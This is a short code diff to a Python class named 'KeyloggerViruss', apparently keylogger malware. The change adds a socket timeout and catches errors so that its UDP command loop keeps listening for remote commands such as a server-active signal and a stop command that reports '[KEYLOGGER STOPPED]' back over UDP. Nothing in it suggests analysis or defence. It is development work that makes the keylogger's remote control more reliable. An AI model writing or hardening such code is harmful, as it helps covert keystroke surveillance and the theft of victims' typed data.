@@ -88,6 +88,7 @@ class KeyloggerViruss():
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', self.port_listen))
+        sock.settimeout(0.5)
         print(f"UDP server listening on {self.host}:{9998} (press Ctrl+C to stop)")
 
         try:
@@ -97,8 +98,15 @@ class KeyloggerViruss():
                         self.start_session()
                         time.sleep(0.1)
 
-                    data, _ = sock.recvfrom(buffer_size)
-                    data = json.loads(data.decode())
+                    try:
+                        data, _ = sock.recvfrom(buffer_size)
+                    except socket.timeout:
+                        continue
+
+                    try:
+                        data = json.loads(data.decode())
+                    except json.JSONDecodeError as e:
+                        continue
 
                     if data.get("command", "") == "Server_active":
                         self.is_active_server = True
@@ -110,8 +118,6 @@ class KeyloggerViruss():
                         message = "[KEYLOGGER STOPPED]"
                         self.send_udp_message(message=message, signal=False)
                         return
-                except json.JSONDecodeError as e:
-                    pass
                 except OSError as e:
                     break
         except KeyboardInterrupt:
